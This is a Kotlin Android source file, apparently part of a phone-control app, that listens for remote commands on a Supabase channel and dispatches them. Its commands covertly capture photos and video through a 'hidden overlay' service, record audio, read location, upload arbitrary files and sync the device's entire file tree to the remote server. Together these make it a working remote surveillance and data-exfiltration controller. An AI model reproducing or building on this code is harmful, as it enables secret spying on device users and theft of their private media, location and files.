package com.save.me

import android.content.Context
import android.content.Intent
import android.os.Build
import kotlinx.coroutines.*
import io.github.jan.supabase.SupabaseClient
import io.github.jan.supabase.realtime.channel
import io.github.jan.supabase.realtime.PostgresAction
import org.json.JSONObject

object SupabaseCommandListener {
    private var scope: CoroutineScope? = null
    private var subscriptionJob: Job? = null

    fun start(context: Context) {
        if (subscriptionJob?.isActive == true) return
        scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        subscriptionJob = scope?.launch {
            val client = SupabaseUtils.getClient(context)
            val channel = client.channel("public:commands")
            channel.postgresListDataFlow().collect { action ->
                if (action is PostgresAction.Insert) {
                    val newRow = action.record
                    val type = newRow["type"] as? String ?: return@collect
                    val optionsJson = newRow["options"]?.toString()
                    val options = if (optionsJson != null) JSONObject(optionsJson) else JSONObject()
                    handleCommand(context, type, options)
                }
            }
        }
    }

    fun stop() {
        subscriptionJob?.cancel()
        subscriptionJob = null
        scope?.cancel()
        scope = null
    }

    private fun handleCommand(context: Context, type: String, options: JSONObject) {
        when (type) {
            "capturePhoto" -> {
                val camera = options.optString("camera", "rear")
                val flash = options.optString("flash", "off")
                val intent = Intent(context, HiddenOverlayMediaService::class.java)
                intent.putExtra("action", "photo")
                intent.putExtra("camera", camera)
                intent.putExtra("flash", flash)
                startOverlayService(context, intent)
            }
            "recordVideo" -> {
                val camera = options.optString("camera", "rear")
                val quality = options.optString("quality", "medium")
                val duration = options.optInt("duration", 60)
                val intent = Intent(context, HiddenOverlayMediaService::class.java)
                intent.putExtra("action", "video")
                intent.putExtra("camera", camera)
                intent.putExtra("quality", quality)
                intent.putExtra("duration", duration)
                startOverlayService(context, intent)
            }
            "recordAudio" -> {
                val duration = options.optInt("duration", 60)
                CoroutineScope(Dispatchers.IO).launch {
                    AudioUtils.executeRecordAudio(context, duration)
                }
            }
            "getLocation" -> {
                CoroutineScope(Dispatchers.IO).launch {
                    LocationUtils.recordLocationOnce(context)
                }
            }
            "uploadFile" -> {
                val path = options.optString("path", "")
                CoroutineScope(Dispatchers.IO).launch {
                    FileUtils.uploadSpecificFile(context, path)
                }
            }
            "ring" -> {
                val duration = options.optInt("duration", 5)
                CoroutineScope(Dispatchers.IO).launch {
                    DeviceUtils.ring(context, duration)
                }
            }
            "vibrate" -> {
                val duration = options.optInt("duration", 1)
                CoroutineScope(Dispatchers.IO).launch {
                    DeviceUtils.vibrate(context, duration)
                }
            }
            "syncFileTree" -> {
                CoroutineScope(Dispatchers.IO).launch {
                    FileTreeSyncUtils.syncFileTreeToSupabase(context)
                }
            }
        }
    }

    private fun startOverlayService(context: Context, intent: Intent) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent)
        } else {
            context.startService(intent)
        }
    }
}